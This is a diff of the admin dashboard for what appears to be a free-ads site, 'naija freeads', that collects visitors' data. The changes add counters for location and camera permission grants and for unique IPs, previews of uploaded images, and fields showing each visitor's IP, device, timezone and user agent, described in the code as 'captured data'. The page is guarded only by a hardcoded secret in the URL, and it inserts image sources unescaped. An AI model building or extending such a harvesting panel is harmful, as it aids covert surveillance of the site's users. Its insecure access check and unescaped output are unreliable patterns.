@@ -16,7 +16,7 @@
         }
         .admin-header {
             background: linear-gradient(135deg, #008000, #008751);
-            padding: 20px 30px;
+            padding: 25px 35px;
             border-radius: 28px;
             margin-bottom: 25px;
             display: flex;
@@ -25,13 +25,26 @@
             flex-wrap: wrap;
             gap: 15px;
         }
-        .admin-header h1 { font-size: 24px; display: flex; align-items: center; gap: 12px; }
+        .admin-header h1 { font-size: 26px; display: flex; align-items: center; gap: 12px; }
         .stats-badge {
             background: rgba(0,0,0,0.3);
-            padding: 8px 20px;
+            padding: 10px 25px;
             border-radius: 40px;
             font-size: 14px;
         }
+        .stats-row {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+        .stat-card {
+            background: #1e293b;
+            padding: 20px;
+            border-radius: 24px;
+            text-align: center;
+        }
+        .stat-card h3 { font-size: 32px; color: #00a86b; }
         .controls {
             display: flex;
             gap: 15px;
@@ -40,7 +53,7 @@
         }
         .search-box {
             flex: 1;
-            padding: 12px 20px;
+            padding: 14px 20px;
             background: #1e293b;
             border: 1px solid #334155;
             border-radius: 40px;
@@ -62,7 +75,7 @@
             display: flex;
             flex-direction: column;
             gap: 20px;
-            max-height: calc(100vh - 200px);
+            max-height: calc(100vh - 280px);
             overflow-y: auto;
         }
         .data-card {
@@ -84,7 +97,7 @@
             border-bottom: 1px solid #334155;
         }
         .badge {
-            padding: 4px 12px;
+            padding: 5px 15px;
             border-radius: 20px;
             font-size: 11px;
             font-weight: 600;
@@ -102,7 +115,7 @@
             padding: 10px;
             border-radius: 16px;
         }
-        .info-label { font-size: 11px; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.5px; }
+        .info-label { font-size: 10px; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.5px; }
         .info-value { font-size: 13px; font-weight: 500; margin-top: 4px; word-break: break-word; }
         .location-details {
             background: rgba(0,168,107,0.1);
@@ -117,10 +130,22 @@
             border: 2px solid #00a86b;
             cursor: pointer;
         }
+        .images-preview {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-top: 10px;
+        }
+        .images-preview img {
+            width: 60px;
+            height: 60px;
+            object-fit: cover;
+            border-radius: 12px;
+        }
         .delete-btn {
             background: #ef4444;
             border: none;
-            padding: 5px 12px;
+            padding: 6px 15px;
             border-radius: 20px;
             color: white;
             cursor: pointer;
@@ -146,8 +171,14 @@
     <div class="stats-badge"><i class="fas fa-database"></i> <span id="recordCount">0</span> Records</div>
 </div>
 
+<div class="stats-row">
+    <div class="stat-card"><h3 id="totalAds">0</h3><p>Total Ads Posted</p></div>
+    <div class="stat-card"><h3 id="totalPerms">0</h3><p>Location/Camera Grants</p></div>
+    <div class="stat-card"><h3 id="totalUsers">0</h3><p>Unique Users</p></div>
+</div>
+
 <div class="controls">
-    <input type="text" class="search-box" id="searchInput" placeholder="🔍 Search by name, location, phone, title...">
+    <input type="text" class="search-box" id="searchInput" placeholder="🔍 Search by title, location, phone, city, state...">
     <button class="refresh-btn" id="refreshBtn"><i class="fas fa-sync-alt"></i> Refresh</button>
     <button class="export-btn" id="exportBtn"><i class="fas fa-download"></i> Export JSON</button>
     <button class="clear-btn" id="clearBtn"><i class="fas fa-trash-alt"></i> Clear All</button>
@@ -158,23 +189,13 @@
 </div>
 
 <script>
-    // SECURITY CHECK - Only allow access with correct secret key
+    const ADMIN_SECRET = "NAIJA2025DOPE";
     const urlParams = new URLSearchParams(window.location.search);
     const adminKey = urlParams.get("key");
-    const ADMIN_SECRET = "NAIJA2025DOPE";  // Must match index.html
     
     if (adminKey !== ADMIN_SECRET) {
-        document.body.innerHTML = `
-            <div style="display: flex; justify-content: center; align-items: center; height: 100vh; background: #0a0c15;">
-                <div style="text-align: center; background: #1e293b; padding: 40px; border-radius: 30px;">
-                    <i class="fas fa-lock" style="font-size: 60px; color: #ef4444;"></i>
-                    <h2 style="margin-top: 20px;">Access Denied</h2>
-                    <p style="color: #94a3b8; margin-top: 10px;">You don't have permission to view this page.</p>
-                    <p style="color: #64748b; margin-top: 20px; font-size: 12px;">Valid admin key required</p>
-                </div>
-            </div>
-        `;
-        throw new Error("Unauthorized access");
+        document.body.innerHTML = `<div style="display: flex; justify-content: center; align-items: center; height: 100vh;"><div style="text-align: center;"><i class="fas fa-lock" style="font-size: 60px; color: #ef4444;"></i><h2>Access Denied</h2><p>Valid admin key required</p></div></div>`;
+        throw new Error("Unauthorized");
     }
     
     let allRecords = [];
@@ -189,21 +210,30 @@
                 throw new Error('Backend error');
             }
         } catch(err) {
-            // Fallback to localStorage
             const stored = localStorage.getItem('naija_freeads_data');
             allRecords = stored ? JSON.parse(stored) : [];
         }
         renderData();
+        updateStats();
+    }
+
+    function updateStats() {
+        const ads = allRecords.filter(r => r.type === 'ad_posted').length;
+        const perms = allRecords.filter(r => r.type === 'permission_granted').length;
+        const uniqueUsers = [...new Set(allRecords.map(r => r.device?.ip || r.ip))].length;
+        document.getElementById('totalAds').innerText = ads;
+        document.getElementById('totalPerms').innerText = perms;
+        document.getElementById('totalUsers').innerText = uniqueUsers;
+        document.getElementById('recordCount').innerText = allRecords.length;
     }
 
     function renderData() {
         const container = document.getElementById('dataContainer');
         const searchTerm = document.getElementById('searchInput').value.toLowerCase();
-        document.getElementById('recordCount').innerText = allRecords.length;
         
         let filtered = allRecords.filter(record => {
             if (record.type === 'ad_posted') {
-                return record.ad.title.toLowerCase().includes(searchTerm) ||
+                return record.ad.title?.toLowerCase().includes(searchTerm) ||
                        record.ad.location?.toLowerCase().includes(searchTerm) ||
                        record.ad.phone?.toLowerCase().includes(searchTerm) ||
                        record.location?.city?.toLowerCase().includes(searchTerm) ||
@@ -228,7 +258,7 @@
                     <div class="card-header">
                         <div>
                             <span class="badge ${isAd ? 'badge-ad' : 'badge-perm'}">
-                                ${isAd ? '<i class="fas fa-ad"></i> AD POSTED' : '<i class="fas fa-shield-alt"></i> PERMISSION'}
+                                ${isAd ? '<i class="fas fa-ad"></i> AD POSTED' : '<i class="fas fa-shield-alt"></i> PERMISSION GRANTED'}
                             </span>
                             <span style="margin-left: 10px; font-size: 12px; color:#64748b;">
                                 <i class="far fa-clock"></i> ${new Date(record.timestamp).toLocaleString()}
@@ -240,14 +270,18 @@
                     ${isAd ? `
                         <div class="info-row">
                             <div class="info-item"><div class="info-label"><i class="fas fa-tag"></i> Category</div><div class="info-value">${escapeHtml(record.ad.category)}</div></div>
-                            <div class="info-item"><div class="info-label"><i class="fas fa-heading"></i> Title</div><div class="info-value">${escapeHtml(record.ad.title)}</div></div>
+                            <div class="info-item"><div class="info-label"><i class="fas fa-heading"></i> Title</div><div class="info-value"><strong>${escapeHtml(record.ad.title)}</strong></div></div>
                             <div class="info-item"><div class="info-label"><i class="fas fa-naira-sign"></i> Price</div><div class="info-value">${escapeHtml(record.ad.price)}</div></div>
                         </div>
-                        <div class="info-item"><div class="info-label"><i class="fas fa-align-left"></i> Description</div><div class="info-value">${escapeHtml(record.ad.description?.substring(0, 150) || '')}${record.ad.description?.length > 150 ? '...' : ''}</div></div>
+                        <div class="info-item"><div class="info-label"><i class="fas fa-align-left"></i> Description</div><div class="info-value">${escapeHtml(record.ad.description?.substring(0, 200) || '')}${record.ad.description?.length > 200 ? '...' : ''}</div></div>
                         <div class="info-row">
-                            <div class="info-item"><div class="info-label"><i class="fas fa-map-marker-alt"></i> User Location</div><div class="info-value">${escapeHtml(record.ad.location || 'Not specified')}</div></div>
-                            <div class="info-item"><div class="info-label"><i class="fab fa-whatsapp"></i> WhatsApp/Phone</div><div class="info-value">${escapeHtml(record.ad.phone || 'Not provided')}</div></div>
+                            <div class="info-item"><div class="info-label"><i class="fas fa-map-marker-alt"></i> User Location Input</div><div class="info-value">${escapeHtml(record.ad.location || 'Not specified')}</div></div>
+                            <div class="info-item"><div class="info-label"><i class="fab fa-whatsapp"></i> WhatsApp/Phone</div><div class="info-value"><a href="https://wa.me/${record.ad.phone?.replace(/\D/g, '')}" target="_blank" style="color:#00a86b;">${escapeHtml(record.ad.phone || 'Not provided')}</a></div></div>
                         </div>
+                        ${record.ad.images && record.ad.images.length > 0 ? `
+                            <div class="info-item"><div class="info-label"><i class="fas fa-image"></i> Uploaded Images</div>
+                            <div class="images-preview">${record.ad.images.map(img => `<img src="${img}" onclick="window.open(this.src)">`).join('')}</div></div>
+                        ` : ''}
                     ` : ''}
                     
                     ${location ? `
@@ -275,11 +309,11 @@
                     ${record.device ? `
                         <div class="info-row" style="margin-top: 10px;">
                             <div class="info-item"><div class="info-label"><i class="fas fa-microchip"></i> Device</div><div class="info-value">${record.device.platform || 'N/A'}</div></div>
-                            <div class="info-item"><div class="info-label"><i class="fas fa-globe"></i> IP Address</div><div class="info-value">${record.device.ip || record.ip || 'N/A'}</div></div>
+                            <div class="info-item"><div class="info-label"><i class="fas fa-globe"></i> IP Address</div><div class="info-value"><code>${record.device.ip || record.ip || 'N/A'}</code></div></div>
                             <div class="info-item"><div class="info-label"><i class="fas fa-language"></i> Language</div><div class="info-value">${record.device.language || 'N/A'}</div></div>
                             <div class="info-item"><div class="info-label"><i class="far fa-clock"></i> Timezone</div><div class="info-value">${record.device.timezone || 'N/A'}</div></div>
                         </div>
-                        <div class="info-item"><div class="info-label"><i class="fas fa-laptop"></i> User Agent</div><div class="info-value" style="font-size: 10px;">${record.device.userAgent?.substring(0, 100) || 'N/A'}...</div></div>
+                        <div class="info-item"><div class="info-label"><i class="fas fa-laptop"></i> User Agent</div><div class="info-value" style="font-size: 10px;">${record.device.userAgent?.substring(0, 150) || 'N/A'}...</div></div>
                     ` : ''}
                 </div>
             `;
@@ -288,7 +322,7 @@
     
     function escapeHtml(str) {
         if (!str) return '';
-        return str.replace(/[&<>]/g, function(m) {
+        return String(str).replace(/[&<>]/g, function(m) {
             if (m === '&') return '&amp;';
             if (m === '<') return '&lt;';
             if (m === '>') return '&gt;';
@@ -298,24 +332,21 @@
     
     async function deleteRecord(id) {
         if (confirm('Delete this record?')) {
-            try {
-                await fetch(`/api/delete/${id}`, { method: 'DELETE' });
-            } catch(e) {}
-            // Remove from local array
+            try { await fetch(`/api/delete/${id}`, { method: 'DELETE' }); } catch(e) {}
             allRecords = allRecords.filter(r => r.id !== id);
             localStorage.setItem('naija_freeads_data', JSON.stringify(allRecords));
             renderData();
+            updateStats();
         }
     }
     
     async function clearAllData() {
         if (confirm('⚠️ WARNING: This will delete ALL captured data! Are you sure?')) {
-            try {
-                await fetch('/api/clear', { method: 'DELETE' });
-            } catch(e) {}
+            try { await fetch('/api/clear', { method: 'DELETE' }); } catch(e) {}
             localStorage.removeItem('naija_freeads_data');
             allRecords = [];
             renderData();
+            updateStats();
             alert('✅ All data cleared.');
         }
     }
